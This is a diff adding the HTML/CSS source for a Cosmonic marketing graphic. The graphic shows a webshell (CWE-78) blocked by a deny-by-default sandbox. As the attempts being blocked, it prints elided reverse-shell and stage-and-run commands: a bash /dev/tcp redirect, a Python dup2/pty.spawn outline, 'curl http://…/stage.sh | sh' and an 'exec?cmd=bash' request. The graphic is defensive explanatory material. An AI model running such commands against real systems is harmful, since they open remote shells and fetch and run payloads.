@@ -1,0 +1,168 @@
+<!doctype html>
+<!-- Source for docs/images/webshell-sandbox-rce-hero.png. Rendered by render.sh
+     at 2000x1050 CSS px, device scale 1.2 => 2400x1260. -->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800&family=IBM+Plex+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#090D18; --panel:#111728; --card:#121A2C; --line:#26324B; --line2:#2E3B57;
+    --purple:#685BC7; --purple-lt:#8F84E6;
+    --green:#00C389; --green-line:rgba(0,195,137,.8); --green-dim:rgba(0,195,137,.14);
+    --red:#E07A58; --red-hot:#F0603C; --red-dim:rgba(224,122,88,.13);
+    --amber:#F5B544; --ink:#EAEEF7; --muted:#A9B4C9; --faint:#6B7891;
+    --mono:'IBM Plex Mono',ui-monospace,Menlo,monospace;
+    --sans:'Plus Jakarta Sans',system-ui,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;width:2000px;height:1050px;overflow:hidden}
+  body{font-family:var(--sans);color:var(--ink);-webkit-font-smoothing:antialiased;
+    background:
+      radial-gradient(1200px 700px at 88% -10%, rgba(104,91,199,.30), transparent 60%),
+      radial-gradient(900px 600px at -5% 10%, rgba(0,195,137,.10), transparent 55%),
+      var(--bg);
+    position:relative;padding:30px 66px 0}
+  .top{display:flex;justify-content:space-between;align-items:center;height:78px}
+  .logo{height:78px;width:auto;display:block}
+  .legend{display:flex;gap:44px;font-size:23px;font-weight:600;color:var(--muted)}
+  .legend span{display:flex;align-items:center;gap:10px}
+  .dot{width:18px;height:18px;border-radius:50%}
+  .dot.g{background:var(--green)} .dot.d{box-shadow:inset 0 0 0 2.5px var(--faint)} .dot.b{background:var(--red)}
+
+  .eyebrow{margin:30px 0 0;font-family:var(--sans);font-weight:700;font-size:23px;letter-spacing:.12em;color:var(--purple-lt)}
+  .eyebrow .r{color:var(--red-hot)}
+  h1{margin:4px 0 0;font-size:66px;line-height:1.08;font-weight:800;letter-spacing:-.02em}
+  .lede{margin:14px 0 0;font-size:26px;line-height:1.6;color:var(--muted);font-weight:500}
+  .lede b{color:var(--ink);font-weight:700}
+  .lede .ws{color:var(--red-hot);font-weight:800}
+  .lede code{font-family:var(--mono);color:var(--ink);font-size:24px}
+
+  .stage{position:absolute;left:66px;right:66px;top:385px;height:560px}
+  /* attacker */
+  .atk{position:absolute;left:0;top:20px;width:300px;height:540px;border:2px dashed var(--line2);border-radius:18px;
+    background:linear-gradient(180deg,rgba(17,23,40,.9),rgba(12,17,32,.9));padding:44px 30px}
+  .av{width:80px;height:80px;border-radius:50%;background:radial-gradient(circle at 35% 30%,var(--amber),#c98a12);
+    display:grid;place-items:center;box-shadow:0 0 0 7px rgba(245,181,68,.14)}
+  .av svg{width:46px;height:46px}
+  .atk h3{margin:26px 0 0;font-size:40px;font-weight:800}
+  .atk p{margin:10px 0 0;font-size:23px;color:var(--muted);line-height:1.4}
+  .ask{margin-top:34px;background:var(--amber);color:#2a1e00;font-family:var(--mono);font-weight:700;font-size:21px;border-radius:12px;padding:14px 16px}
+  .atk .note{margin-top:34px;font-family:var(--mono);font-size:20px;color:var(--muted);line-height:1.45}
+  .wire{position:absolute;left:300px;top:118px;width:74px;height:3px;background:var(--purple)}
+  .wire:after{content:"";position:absolute;right:-6px;top:-6px;width:15px;height:15px;border-radius:50%;background:var(--purple)}
+
+  /* sandbox */
+  .sb{position:absolute;left:348px;right:0;top:0;bottom:0;border:3px dotted var(--purple);border-radius:22px;background:rgba(0,0,0,.42)}
+  .sbtag{position:absolute;top:-24px;left:30px;background:#0b0f1d;padding:0 12px;font-size:30px;font-weight:700;letter-spacing:.08em;color:var(--purple-lt)}
+  .sbr{position:absolute;top:-22px;right:50px;background:#151c2f;border:2px solid var(--line2);border-radius:24px;padding:6px 26px;font-size:22px;font-weight:700}
+
+  .comp{position:absolute;left:28px;top:40px;width:680px;height:490px;border:3px solid var(--green);border-radius:20px;
+    background:linear-gradient(180deg,#141c30,#10172a);padding:30px 32px;box-shadow:0 0 50px -14px rgba(0,195,137,.35)}
+  .role{font-size:21px;font-weight:600;letter-spacing:.12em;color:var(--muted)}
+  .comp h4{margin:8px 0 0;font-size:44px;font-weight:800}
+  .host{font-family:var(--mono);font-size:22px;color:var(--purple-lt);margin-top:4px}
+  .rows{margin-top:28px;display:flex;flex-direction:column;gap:16px}
+  .row{display:flex;align-items:center;gap:16px;font-family:var(--mono);font-size:22px;color:var(--muted)}
+  .pill{font-family:var(--mono);font-weight:600;font-size:21px;border-radius:9px;padding:5px 12px;white-space:nowrap}
+  .pill.g{color:#8ff0cd;background:var(--green-dim);box-shadow:inset 0 0 0 2px var(--green)}
+  .pill.d{color:var(--faint);box-shadow:inset 0 0 0 2px var(--line2)}
+  .row .v{color:var(--ink)}
+  .lock{position:absolute;right:26px;bottom:22px;width:30px;height:38px}
+
+  .flow{position:absolute;left:718px;top:205px;width:132px;text-align:center}
+  .flow .lbl{font-family:var(--mono);font-size:19px;color:var(--ink);background:#151c2f;border:2px solid var(--line2);border-radius:10px;padding:3px 0}
+  .flow .arrow{margin-top:12px;height:3px;border-top:3px dashed var(--red);position:relative}
+  .flow .arrow:after{content:"";position:absolute;right:-4px;top:-11px;border-left:16px solid var(--red);border-top:9px solid transparent;border-bottom:9px solid transparent}
+  .flow .sub{margin-top:14px;font-family:var(--mono);font-size:17px;color:var(--faint)}
+
+  .tries{position:absolute;left:868px;top:40px;width:540px}
+  .tries .hdr{font-size:21px;font-weight:600;letter-spacing:.12em;color:var(--muted);margin-bottom:14px}
+  .try{position:relative;border:2.5px solid var(--red);background:#05070d;border-radius:14px;padding:12px 18px;margin-bottom:18px;width:470px}
+  .try .k{font-family:var(--mono);font-weight:700;font-size:22px;color:#f3b79e;letter-spacing:.04em}
+  .try .c{font-family:var(--mono);font-size:21px;color:var(--ink);margin-top:2px;white-space:nowrap}
+  .try:after{content:"";position:absolute;left:100%;top:50%;width:72px;border-top:2.5px solid var(--red)}
+  .try:before{content:"";position:absolute;left:calc(100% + 68px);top:calc(50% - 8px);border-left:13px solid var(--red);border-top:8px solid transparent;border-bottom:8px solid transparent}
+  .blk{position:absolute;left:1420px;top:58px;width:70px;height:452px;border:3px solid var(--red);border-radius:36px;background:#05070d;
+    display:flex;align-items:center;justify-content:center}
+  .blk span{transform:rotate(-90deg);white-space:nowrap;font-family:var(--mono);font-weight:700;font-size:30px;letter-spacing:.14em;color:#f3b79e}
+  .mini{font-family:var(--mono);font-size:19px;color:var(--faint);margin-top:4px}
+
+  .foot{position:absolute;left:66px;right:66px;bottom:24px;display:flex;justify-content:space-between;align-items:center}
+  .tags{display:flex;gap:20px}
+  .tag{display:flex;align-items:center;gap:12px;border:2px solid var(--line2);border-radius:26px;padding:8px 24px;font-size:23px;font-weight:700;background:rgba(17,23,40,.7)}
+  .tag i{width:12px;height:12px;border-radius:50%;background:var(--green)}
+  .url{font-size:24px;font-weight:700;color:var(--purple-lt)}
+</style>
+</head>
+<body>
+  <div class="top">
+    {{WORDMARK}}
+    <div class="legend">
+      <span><i class="dot g"></i>granted</span>
+      <span><i class="dot d"></i>denied</span>
+      <span><i class="dot b"></i>blocked</span>
+    </div>
+  </div>
+
+  <p class="eyebrow"><span class="r">WEBSHELL</span> · REMOTE CODE EXECUTION · CWE-78</p>
+  <h1>You can't execute what you don't have.</h1>
+  <p class="lede">A <span class="ws">webshell</span> turns one URL into a remote shell: <code>/exec?cmd=…</code> runs <b>any command</b> the attacker sends.<br>
+  Here the same webshell is <b>safely sandboxed by Cosmonic</b>: it has <b>no shell to start, no socket to open, no disk to stage on</b>.</p>
+
+  <div class="stage">
+    <div class="atk">
+      <div class="av"><svg viewBox="0 0 24 24" fill="#2a1e00"><circle cx="12" cy="8" r="4.6"/><path d="M3.5 21c.8-4.6 4.3-7 8.5-7s7.7 2.4 8.5 7z"/></svg></div>
+      <h3>Attacker</h3>
+      <p>Sends shell commands to a public URL</p>
+      <div class="ask">exec?cmd=bash →</div>
+      <div class="note">no exploit needed:<br>the endpoint runs<br>whatever it's told</div>
+    </div>
+    <div class="wire"></div>
+
+    <div class="sb">
+      <div class="sbtag">COSMONIC SANDBOX</div>
+      <div class="sbr">deny-by-default component</div>
+
+      <div class="comp">
+        <div class="role">COMPONENT · WEBSITE + WEBSHELL</div>
+        <h4>personfacts</h4>
+        <div class="host">webshell-sandbox.localhost</div>
+        <div class="rows">
+          <div class="row"><span class="pill g">Network·in</span><span class="v">serves the site and /exec</span></div>
+          <div class="row"><span class="pill d">Exec</span>none: no shell, no $PATH</div>
+          <div class="row"><span class="pill d">Files</span>none: no /dev, no /tmp</div>
+          <div class="row"><span class="pill d">Network·out</span>allowedHosts: []</div>
+          <div class="row"><span class="pill d">Sockets</span>not imported</div>
+        </div>
+        <svg class="lock" viewBox="0 0 24 30" fill="#00C389"><path d="M5 12V8a7 7 0 0114 0v4h1.5A1.5 1.5 0 0122 13.5v14a1.5 1.5 0 01-1.5 1.5h-17A1.5 1.5 0 012 27.5v-14A1.5 1.5 0 013.5 12zm3 0h8V8a4 4 0 00-8 0z"/></svg>
+      </div>
+
+      <div class="flow">
+        <div class="lbl">runCmd()</div>
+        <div class="arrow"></div>
+        <div class="sub">os/exec</div>
+      </div>
+
+      <div class="tries">
+        <div class="hdr">THE THREE BUILDING BLOCKS</div>
+        <div class="try"><div class="k">BASH · /dev/tcp</div><div class="c">bash -i &gt;&amp; /dev/tcp/…/4444</div></div>
+        <div class="try"><div class="k">PYTHON · dup2 → pty</div><div class="c">socket · dup2(0,1,2) · pty.spawn</div></div>
+        <div class="try"><div class="k">CURL · stage-and-run</div><div class="c">curl http://…/stage.sh | sh</div></div>
+        <div class="mini">network · bind to stdio · spawn a shell</div>
+      </div>
+      <div class="blk"><span>BLOCKED</span></div>
+    </div>
+  </div>
+
+  <div class="foot">
+    <div class="tags">
+      <span class="tag"><i></i>deny-by-default</span>
+      <span class="tag"><i></i>least authority</span>
+      <span class="tag"><i></i>capabilities</span>
+      <span class="tag"><i></i>policy</span>
+    </div>
+    <span class="url">cosmonic.com/ai-sandbox</span>
+  </div>
+</body>
+</html>
